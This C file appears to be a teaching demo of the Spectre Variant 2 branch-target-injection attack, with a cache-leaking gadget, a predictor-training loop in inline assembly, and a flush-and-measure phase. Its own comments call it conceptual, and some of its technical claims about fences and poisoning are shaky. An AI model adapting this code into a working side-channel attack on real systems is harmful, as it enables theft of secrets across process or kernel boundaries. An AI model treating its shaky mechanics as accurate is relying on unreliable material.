#include "utils.c"
// --- Spectre Variant 2 (Branch Target Injection) ---

// A "gadget" function that, if speculatively executed, leaks a byte via cache side-channel.
// In a real scenario, this would be an existing code sequence (gadget) in the victim's address space.
__attribute__((noinline))
void speculative_gadget_v2(uint8_t value_to_leak) {
    probe_array[value_to_leak * CACHE_LINE_SIZE] = 1;
}

// Victim function with an indirect call that can be hijacked.
// The `func_ptr` would ideally point to a legitimate function,
// but we'll try to redirect it speculatively.
typedef void (*indirect_func_ptr_t)(uint8_t);

// A dummy target function for the indirect call, for architectural execution.
__attribute__((noinline))
void architectural_target_v2(uint8_t val) {
    // This function is called architecturally.
    // It must NOT leak the secret.
    printf("Architectural execution reached benign target with value %d.\n", val);
}

int main_spectre_v2() {
    common_init();
    printf("\n--- Running Spectre Variant 2 (Branch Target Injection) Demo ---\n");

    uint8_t secret_value_v2 = 'T'; // The secret byte to leak via gadget

    // --- Training Phase (BTB Poisoning) ---
    // This is the most complex and architecture-specific part.
    // There is no direct C intrinsic to "train" the BTB. It involves
    // executing a sequence of indirect branches that share the same
    // branch history as the victim's call site, causing the BTB to
    // predict the `speculative_gadget_v2` address.
    //
    // For this conceptual example, we simulate poisoning by repeatedly calling
    // a function pointer that points to `speculative_gadget_v2`, mixed with benign targets.
    // In a real attack, this training would happen in attacker-controlled code,
    // carefully designed to influence the BTB of the victim process/kernel.
    
    printf("Poisoning BTB with speculative gadget address...\n");
    indirect_func_ptr_t train_ptr = speculative_gadget_v2;
    for (int i = 0; i < 5000; i++) {
        // Repeatedly call the gadget address, but avoid full architectural execution.
        // This is a simplification. Actual poisoning involves precise instruction sequences.
        // On some architectures/mitigations, you might need JMP/CALL with LFENCE.
        // Example with inline assembly for training (conceptual):
        __asm__ __volatile__(
            "callq *%0\n\t"   // Indirect call to gadget
            "mfence\n\t"      // Full memory fence
            "lfence\n\t"      // Load fence to block speculative loads
            : : "r"(train_ptr) : "memory"
        );
    }
    _mm_mfence(); // Ensure training is globally visible
    
    // --- Attack Phase ---
    flush_probe_array(); // Clear probe array
    _mm_lfence();

    printf("Triggering victim indirect call with architectural target...\n");
    // Call the victim function with its legitimate target.
    // Due to BTB poisoning, the CPU *speculatively* executes `speculative_gadget_v2`.
    // The secret would be passed to the gadget speculatively, e.g., if it's in a register
    // that the gadget reads, or if the gadget itself reads privileged memory.
    // For this conceptual demo, we assume the gadget can use `secret_value_v2`.
    
    // The actual call for the architectural path:
    indirect_func_ptr_t victim_ptr = architectural_target_v2;
    victim_ptr(secret_value_v2); // Architectural path takes this.

    // A crucial fence to prevent architectural completion from cleaning up
    // the microarchitectural effects of the speculative execution.
    _mm_lfence(); 

    // --- Measurement Phase ---
    perform_measurement(secret_value_v2, "Spectre V2 secret");

    printf("Actual secret data: %c\n", secret_value_v2);
    return 0;
}